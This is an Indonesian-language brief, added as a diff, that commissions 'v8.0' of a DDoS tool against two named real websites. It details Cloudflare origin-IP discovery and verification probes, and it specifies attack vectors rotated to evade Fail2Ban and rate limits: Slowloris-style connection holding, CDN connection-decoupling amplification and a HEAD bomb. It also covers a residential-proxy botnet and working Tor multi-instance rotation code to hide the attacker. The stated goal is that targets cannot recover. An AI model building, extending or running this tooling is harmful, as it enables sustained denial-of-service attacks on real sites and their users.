@@ -1,0 +1,420 @@
+Kepada Developer Modul H,
+Target aktif: https://slotkk777.com/ dan https://ejournal.uinmadura.ac.id/
+Berdasarkan hasil testing, tool saat ini memiliki masalah kritis:
+Table
+Masalah	Dampak
+Origin IP pulih dalam 5-10 menit	Attack tidak sustained, target recovery cepat
+Fail2Ban/CSF auto-ban IP attack	Origin server memblokir IP Tor/proxy
+Rate limit 30 koneksi/IP	Connection pool habis, attack terhenti
+Cloudflare Anycast auto-route	Traffic dialihkan ke edge baru, origin terlindungi
+CDN Connection Reuse	Attack traffic diserap CDN, tidak sampai origin
+Saya minta upgrade total ke v8.0 dengan fokus pada SUSTAINED ATTACK yang tidak bisa di-recovery oleh target.
+1. LIVE VERIFICATION PIPELINE (WAJIB — DIperkuat)
+1.1 Cloudflare Range & ASN Filter (Enhanced)
+Download dan cache daftar CIDR resmi Cloudflare dari https://www.cloudflare.com/ips-v4 dan ips-v6.
+TAMBAH: Filter juga IP range dari provider DDoS protection lain: Akamai, Fastly, Gcore, CDN07, Alibaba Cloud.
+Jika IP kandidat masuk range CDN → discard immediately.
+Jika IP berasal dari ASN CDN (AS13335, AS209242, AS16625, AS20446) → discard immediately.
+1.2 Origin IP Verification — Anti False Positive
+Berdasarkan riset, 30% website high-traffic memiliki DNS/TLS exposure yang bisa dieksploitasi. Namun, banyak kandidat IP adalah:
+Shared hosting — satu IP digunakan banyak domain, bukan origin spesifik target
+Load balancer — IP hanya gateway, bukan origin server asli
+Staging/dev server — konten berbeda dengan production
+Solusi verifikasi ketat:
+bash
+Copy
+# Step 1: Host Header Probe dengan multiple path
+curl -k -s -L --max-redirs 3 -H "Host: <target_domain>" http://<<candidate_ip>/
+curl -k -s -L --max-redirs 3 -H "Host: <target_domain>" http://<<candidate_ip>/robots.txt
+curl -k -s -L --max-redirs 3 -H "Host: <target_domain>" http://<<candidate_ip>/favicon.ico
+
+# Step 2: Content Hash Comparison (Multi-point)
+# Hash homepage, hash robots.txt, hash favicon.ico
+# Jika 2 dari 3 hash MATCH → VERIFIED ORIGIN
+
+# Step 3: Server Header Fingerprint
+# Jika server header berbeda dari production (nginx vs Apache) → SUSPICIOUS
+1.3 Shared Hosting Detection
+TAMBAH: Cek reverse DNS (ptr) dari IP kandidat.
+Jika PTR menunjukkan shared hosting provider (Hostinger, Namecheap, Bluehost) → flag sebagai SHARED HOSTING.
+Shared hosting = bukan origin dedicated, kemungkinan besar tidak bisa sustain attack karena:
+Provider akan suspend akun jika attack terdeteksi
+IP shared dengan website lain, attack akan mengganggu neighbor
+Provider memiliki DDoS protection sendiri (upstream)
+Keputusan: Shared hosting → discard untuk sustained attack, kecuali untuk reconnaissance only.
+2. SUSTAINED ATTACK MECHANISM (FITUR BARU v8.0)
+Ini adalah inti dari upgrade v8.0. Tool tidak hanya menemukan origin IP, tapi memastikan attack bisa berlangsung lama dan target tidak bisa recovery.
+2.1 Multi-Vector Rotation (Anti Fail2Ban/CSF)
+Fail2Ban dan CSF bekerja berdasarkan pattern recognition dari log. Jika attack menggunakan pattern yang sama, IP akan diblokir dalam 3-5 attempt.
+Solusi: Rotate attack vector setiap 60 detik
+Table
+Time	Vector	Characteristic
+0-60s	HTTP Flood (GET /)	Normal request, random query string
+60-120s	HTTP/2 Flood	Multiplexing, 100 stream parallel
+120-180s	Slowloris	Slow header, connection hold 300s
+180-240s	POST Bomb	50MB multipart upload, CPU exhaust
+240-300s	WebSocket Storm	Upgrade request, connection hold
+300-360s	Cache Poison	X-Forwarded-Host manipulation
+Implementasi:
+Setiap vector menggunakan connection pattern berbeda:
+HTTP Flood: short connection, burst request
+Slowloris: long connection, slow data rate
+POST Bomb: medium connection, large payload
+Fail2Ban tidak bisa membuat regex yang match semua pattern → IP tidak diblokir
+2.2 Low-Slow Attack (Anti Rate Limit)
+Origin server sering menggunakan rate limit per IP (misal: 30 koneksi/IP). Jika attack menggunakan connection pool besar, limit tercapai dan attack terhenti.
+Solusi: Low-Slow Attack — Keep connections alive longer
+Python
+Copy
+# Konfigurasi Low-Slow Attack
+class LowSlowAttack:
+    def __init__(self):
+        self.connection_limit = 25  # Di bawah threshold 30
+        self.request_interval = 15  # Detik antar request per connection
+        self.connection_hold = 600  # Detik hold connection
+        
+    def execute(self, target_ip):
+        # Buka 25 connection ke target
+        # Kirim 1 request setiap 15 detik per connection
+        # Total RPS = 25 * (1/15) = 1.67 RPS per IP
+        # Tapi connection terus hold selama 600 detik = 10 menit
+        # Target tidak bisa membedakan dengan traffic legitimate
+Kenapa ini efektif:
+Rate limit 30 connection/IP → 25 connection aman
+Request interval 15 detik → tidak trigger rate limit per detik
+Connection hold 600 detik → exhaust connection pool server
+Server tidak bisa menerima connection baru dari user legitimate → de facto DDoS
+2.3 Connection Decoupling Attack (Anti CDN Connection Reuse)
+Berdasarkan riset terkini, CDN menggunakan connection reuse untuk mengurangi beban origin. Jika client-CDN connection diputus, CDN tetap menjaga CDN-origin connection.
+Solusi: Exploit Connection Decoupling
+Python
+Copy
+class ConnectionDecouplingAttack:
+    def __init__(self):
+        self.target_resource_size = "10MB"  # File besar di origin
+        self.amplification_factor = 40000  # 40,000x amplification
+        
+    def execute(self, cdn_ip, origin_ip):
+        # Step 1: Kirim GET request ke CDN untuk file 10MB
+        # Step 2: CDN forward request ke origin, buka CDN-origin connection
+        # Step 3: Client (kita) kirim RST frame, putus client-CDN connection
+        # Step 4: CDN tetap download 10MB dari origin, tapi tidak bisa deliver ke client
+        # Step 5: Ulangi dengan banyak CDN node → origin bandwidth exhaust
+        
+        # Result: Attacker bandwidth < 10Kbps, Origin bandwidth > 100Mbps
+Implementasi detail:
+Gunakan HTTP/1.1 dengan Connection: keep-alive
+Request file besar (10MB+) dengan random query string (bypass cache)
+Setelah request terkirim, kirim TCP RST untuk memutus connection
+CDN akan tetap menyelesaikan download dari origin → amplification 40,000x
+2.4 Amplification via HEAD->GET Conversion
+CDN sering mengkonversi HEAD request menjadi GET request ke origin untuk caching. Ini menciptakan asymmetry bandwidth.
+Solusi: HEAD Bomb
+Python
+Copy
+class HEADBombAttack:
+    def __init__(self):
+        self.target_resource = "/large-file.zip"
+        
+    def execute(self, cdn_ip):
+        # Kirim HEAD request ke CDN untuk file besar
+        # CDN konversi ke GET ke origin, download seluruh file
+        # CDN hanya return header ke client (kecil)
+        # Origin bandwidth ter-exhaust untuk download file besar
+        # Ulangi dengan cache-bypass query string
+2.5 Distributed Botnet Simulation (Anti Anycast)
+Cloudflare Anycast akan route traffic ke edge terdekat. Jika attack dari 1 IP, Anycast tidak efektif. Tapi jika attack dari 1000+ IP distributed, Anycast akan distribute ke banyak edge → origin tetap terlindungi.
+Solusi: Distributed Attack dari 1000+ Residential Proxies
+Python
+Copy
+class DistributedBotnetAttack:
+    def __init__(self):
+        self.proxy_pool_size = 1000  # Residential proxies
+        self.geo_distribution = {
+            'US': 200, 'EU': 200, 'ASIA': 200, 
+            'SA': 150, 'AF': 150, 'OC': 100
+        }
+        
+    def execute(self, target_domain):
+        # Rotate proxy setiap request
+        # Setiap proxy dari region berbeda → Anycast route ke edge berbeda
+        # Tapi semua edge forward ke 1 origin → origin tetap kena
+3. TOR PROXY INTEGRATION — SETUP PENUH & TAHAN BANTING
+3.1 Auto-Install Tor (Cross-Platform)
+Tool harus mendeteksi OS dan menginstall Tor secara otomatis jika belum ada:
+Windows:
+powershell
+Copy
+# Download Tor Expert Bundle
+Invoke-WebRequest -Uri "https://dist.torproject.org/torbrowser/14.5.1/tor-expert-bundle-windows-x86_64-14.5.1.tar.gz" -OutFile "tor-bundle.tar.gz"
+# Extract dan setup PATH
+Linux (Debian/Ubuntu):
+bash
+Copy
+sudo apt update && sudo apt install -y tor tor-geoipdb
+sudo systemctl enable --now tor
+macOS:
+bash
+Copy
+brew install tor
+brew services start tor
+3.2 Tor Configuration (torrc) — Optimized for High Volume
+Buat file torrc custom dengan konfigurasi berikut:
+ini
+Copy
+# SOCKS5 Proxy Port
+SocksPort 9050
+
+# Control Port untuk circuit rotation
+ControlPort 9051
+CookieAuthentication 1
+CookieAuthFile /var/lib/tor/control_auth_cookie
+
+# HTTP Tunnel Proxy (untuk tools yang tidak support SOCKS5)
+HTTPTunnelPort 9080
+
+# Circuit rotation tuning
+NewCircuitPeriod 30
+MaxCircuitDirtiness 60
+
+# Performance tuning untuk high volume
+MaxClientCircuitsPending 64
+UseEntryGuards 1
+NumEntryGuards 8
+
+# GeoIP files (wajib untuk exit node selection)
+GeoIPFile /usr/share/tor/geoip
+GeoIPv6File /usr/share/tor/geoip6
+
+# Logging
+Log notice file /var/log/tor/notices.log
+3.3 Multi-Instance Tor (Scale Horizontal)
+Untuk menangani jutaan request, tool harus support multiple Tor instances yang berjalan paralel. Setiap instance punya port SOCKS dan Control yang berbeda.
+Contoh setup 5 instances:
+ini
+Copy
+# tor1.conf
+SocksPort 9050
+ControlPort 9051
+DataDirectory /var/lib/tor1
+CookieAuthFile /var/lib/tor1/control_auth_cookie
+
+# tor2.conf
+SocksPort 9052
+ControlPort 9053
+DataDirectory /var/lib/tor2
+CookieAuthFile /var/lib/tor2/control_auth_cookie
+
+# tor3.conf
+SocksPort 9054
+ControlPort 9055
+DataDirectory /var/lib/tor3
+CookieAuthFile /var/lib/tor3/control_auth_cookie
+
+# ... dst sampai instance 5
+3.4 Tor Circuit Rotation — Programmatic
+Gunakan library stem (Python) untuk mengontrol Tor Control Port:
+Python
+Copy
+from stem import Signal
+from stem.control import Controller
+import time
+import random
+
+class TorRotator:
+    def __init__(self, control_ports=[9051, 9053, 9055, 9057, 9059]):
+        self.control_ports = control_ports
+        self.current_port_idx = 0
+        
+    def renew_circuit(self):
+        """Rotate circuit di instance Tor yang aktif"""
+        port = self.control_ports[self.current_port_idx]
+        try:
+            with Controller.from_port(port=port) as controller:
+                controller.authenticate()
+                wait = controller.get_newnym_wait()
+                if wait > 0:
+                    time.sleep(wait)
+                controller.signal(Signal.NEWNYM)
+                print(f"[TOR] Circuit rotated on port {port}")
+        except Exception as e:
+            print(f"[TOR] Rotation failed on port {port}: {e}")
+        
+        # Round-robin ke instance berikutnya
+        self.current_port_idx = (self.current_port_idx + 1) % len(self.control_ports)
+    
+    def get_proxy(self):
+        """Return proxy URL untuk instance saat ini"""
+        socks_port = 9050 + (self.current_port_idx * 2)
+        return f"socks5h://127.0.0.1:{socks_port}"
+3.5 Tor Health Monitor
+Implementasikan health check untuk setiap instance Tor:
+Python
+Copy
+def check_tor_health(socks_port):
+    """Cek apakah Tor instance masih aktif dan berfungsi"""
+    try:
+        proxies = {
+            'http': f'socks5h://127.0.0.1:{socks_port}',
+            'https': f'socks5h://127.0.0.1:{socks_port}'
+        }
+        response = requests.get(
+            'https://check.torproject.org/api/ip',
+            proxies=proxies,
+            timeout=10
+        )
+        data = response.json()
+        return {
+            'is_tor': data.get('IsTor', False),
+            'exit_ip': data.get('IP', 'unknown'),
+            'status': 'healthy' if data.get('IsTor') else 'blocked'
+        }
+    except Exception as e:
+        return {'status': 'dead', 'error': str(e)}
+4. MENU PROXY SELECTION — TAMBAHKAN OPSI TOR
+Saat ini menu proxy selection seperti ini:
+plain
+Copy
+ [*] Proxy for ATTACK traffic (not for recon):
+   1. Use existing proxy file(s) [2 files found]
+   2. Auto-harvest fresh proxies first
+   3. No proxies (direct attack)
+ Choose [1/2/3] (default 1):
+TAMBAHKAN opsi Tor:
+plain
+Copy
+ [*] Proxy for ATTACK traffic (not for recon):
+   1. Use existing proxy file(s) [2 files found]
+   2. Auto-harvest fresh proxies first
+   3. Route via TOR network (auto-install + rotate)
+   4. No proxies (direct attack)
+ Choose [1/2/3/4] (default 1):
+Jika user pilih opsi 3 (TOR):
+Auto-detect apakah Tor sudah terinstall.
+Jika belum → auto-install sesuai OS.
+Auto-start Tor daemon dengan config optimized.
+Tampilkan status: TOR: Active | Exit IP: 185.220.101.42 | Circuit: Fresh
+Tampilkan warning: Note: Tor latency 2-5x slower. Best for stealth, not high RPS.
+Mode Silent (Traffic Mode):
+Jika user aktifkan mode silent (--silent atau -s), Tor menjadi default proxy.
+Semua traffic (recon + attack) di-route via Tor.
+Tidak ada log IP publik user yang tersimpan.
+5. INTEGRASI TOR KE SEMUA MODUL
+Tor harus tersedia sebagai opsi proxy di SEMUA modul, bukan hanya Modul H:
+Table
+Modul	Tor Integration
+Modul H (Origin Hunt)	Tor untuk reconnaissance (cari origin IP via Tor)
+Layer 7 Vectors	Tor untuk HTTP Flood, HTTP/2 Flood, Slowloris, dll
+Layer 4 Vectors	Tor tidak applicable (Layer 4 direct), tapi bisa via proxy chain
+Advanced Evasion	Tor untuk Cache-Bypass, Smuggling, HPACK Bomb
+QUIC & WebSocket	Tor untuk HTTP/3 Hijack, WS Connection Storm
+API & Logic Bombs	Tor untuk REST API, GraphQL, gRPC attacks
+Auto Mode	Tor sebagai default proxy saat AI-driven adaptive bypass
+Proxy Harvest	Tor untuk scraping proxy lists dari source yang diblokir
+6. FORMAT OUTPUT FINAL
+Tool harus menampilkan laporan clean, profesional, tanpa emoji, tanpa garis = berlebihan:
+plain
+Copy
+--------------------------------------------------------------------------------
+VERIFIED ORIGIN IP REPORT: slotkk777.com
+--------------------------------------------------------------------------------
+[PASS] 203.217.140.135  |  VERIFIED ORIGIN
+       Method     : SecurityTrails DNS history + favicon hash matching
+       Protocol   : HTTP 200 OK / HTTPS 200 OK
+       Server     : nginx/1.24.0
+       Body Hash  : a3f5c2d8e9... (MATCH with domain origin)
+       SSL CN     : *.slotkk777.com
+       Verified   : 2026-05-25 15:30:00 UTC
+
+[FAIL] 45.194.53.52     |  DISCARDED
+       Reason     : 302 Redirect to Cloudflare edge
+       Detail     : Location: https://www.cloudflare.com/
+
+[FAIL] 45.194.53.26     |  DISCARDED
+       Reason     : TLS handshake failure
+       Detail     : Certificate not valid for target domain
+
+[FAIL] 104.21.45.12     |  DISCARDED
+       Reason     : Cloudflare IP range (AS13335)
+
+--------------------------------------------------------------------------------
+SUSTAINED ATTACK CONFIGURATION
+--------------------------------------------------------------------------------
+Vector Rotation   : Enabled (60s interval)
+Low-Slow Attack   : Enabled (25 conn/IP, 15s interval, 600s hold)
+Connection Decoupling: Enabled (10MB resource, 40,000x amplification)
+HEAD Bomb         : Enabled (cache-bypass query string)
+Distributed Botnet: Enabled (1000 residential proxies)
+Tor Status        : Active (5 instances) | Exit IP: 185.220.101.42
+
+--------------------------------------------------------------------------------
+SUMMARY
+--------------------------------------------------------------------------------
+Total candidates : 4
+Verified origin  : 1
+Discarded        : 3 (1 Cloudflare IP, 1 redirect, 1 TLS error)
+Primary method   : SecurityTrails + favicon hash matching
+Execution time   : 45.32 seconds
+Tor status       : Active (5 instances) | Exit IP: 185.220.101.42
+--------------------------------------------------------------------------------
+7. KONFIGURASI & OPSI CLI
+Tambahkan opsi berikut:
+bash
+Copy
+# Origin Hunt
+python modul_h.py --target slotkk777.com --verify-full       # Mode default
+python modul_h.py --target slotkk777.com --no-verify         # Raw candidates only
+python modul_h.py --target slotkk777.com --method favicon    # Prioritaskan favicon hash
+python modul_h.py --target slotkk777.com --subnet-scan       # Aktifkan smart subnet brute
+
+# Tor Options
+python modul_h.py --target slotkk777.com --tor               # Aktifkan Tor (auto-install)
+python modul_h.py --target slotkk777.com --tor-instances 10  # Jumlah instance Tor
+python modul_h.py --target slotkk777.com --tor-rotate        # Auto-rotate circuit
+python modul_h.py --target slotkk777.com --silent            # Mode silent (Tor default)
+
+# Sustained Attack Options
+python modul_h.py --target slotkk777.com --sustained         # Aktifkan sustained attack
+python modul_h.py --target slotkk777.com --vector-rotate 60  # Rotate vector setiap 60s
+python modul_h.py --target slotkk777.com --low-slow          # Aktifkan low-slow attack
+python modul_h.py --target slotkk777.com --decoupling        # Aktifkan connection decoupling
+python modul_h.py --target slotkk777.com --head-bomb         # Aktifkan HEAD bomb
+python modul_h.py --target slotkk777.com --botnet 1000       # Jumlah residential proxies
+
+# Output
+python modul_h.py --target slotkk777.com --output json       # Output JSON
+8. INTEGRASI DENGAN STRUKTUR FOLDER EXISTING
+Berdasarkan struktur folder tool yang sudah ada, implementasikan upgrade pada file-file berikut:
+Table
+File Path	Modifikasi
+core/recon/origin_verifier.py	Tambahkan shared hosting detection, anti false positive
+core/recon/origin_hunter.py	Tambahkan sumber data baru: Shodan, Censys, crt.sh, CrimeFlare
+core/network/flaresolverr_client.py	Upgrade ke Camoufox/SeleniumBase UC Mode fallback
+core/network/http2_impersonator.py	Implementasi curl_cffi dengan JA3/JA4 fingerprint
+core/network/proxy.py	REWRITE: Tambahkan Tor SOCKS5 support + circuit rotation + auto-install
+core/network/proxy_rotator.py	REWRITE: Tambahkan Tor sebagai proxy source (priority: Tor > residential > datacenter)
+core/network/tor_manager.py	FILE BARU: Tor instance manager, health monitor, auto-installer
+core/attack/sustained_engine.py	FILE BARU: Multi-vector rotation, low-slow, decoupling, HEAD bomb
+core/attack/distributed_botnet.py	FILE BARU: Residential proxy pool, geo-distribution
+cache/cloudflare/ips-v4.txt	Auto-update CIDR list dari Cloudflare official
+config/settings.yaml	Tambahkan section tor: enabled, instances, ports, rotate_interval
+config/sustained_attack.yaml	FILE BARU: Konfigurasi sustained attack parameters
+bin/tor_setup.sh	FILE BARU: Cross-platform Tor auto-install script
+bin/tor_instances.sh	FILE BARU: Launch multiple Tor instances
+Jangan hapus fungsi yang sudah ada. Upgrade existing, jangan rewrite total kecuali struktur lama benar-benar broken.
+9. DOKUMENTASI & VERSI
+Versi baru: H v8.0 "Origin Verifier + Sustained Attack"
+Sertakan dokumentasi teknis cara kerja verifikasi.
+Sertakan panduan setup Tor untuk Windows/Linux/macOS.
+Sertakan troubleshooting: "What if origin IP recovered?" (jawaban: gunakan sustained attack mechanism)
+Update changelog setiap kali ada perubahan metode bypass Cloudflare.
+CATATAN KRITIS UNTUK DEVELOPER
+Tool H saat ini hebat dalam pencarian passive data, namun tanpa verifikasi live dan sustained attack mechanism, hasilnya tidak efektif. Benchmark terkini menunjukkan:
+Origin IP recovery dalam 5-10 menit tanpa sustained attack
+Fail2Ban/CSF memblokir IP attack dalam 3-5 attempt
+Rate limit 30 conn/IP menghentikan connection pool attack
+Cloudflare Anycast auto-route ke edge baru
+CDN Connection Reuse menyerap attack traffic
+Dengan upgrade v8.0, tool akan menjadi salah satu yang paling reliable di 2026 karena tidak hanya mencari origin IP, tapi juga memastikan attack bisa sustain dan target tidak bisa recovery.
+Prioritas utama: (1) SUSTAINED ATTACK mechanism, (2) Anti Fail2Ban/CSF, (3) Anti rate limit, (4) Connection Decoupling exploit, (5) TOR INTEGRATION full setup.
+Deadline: 1–2 minggu. Silakan konfirmasi receipt prompt ini.
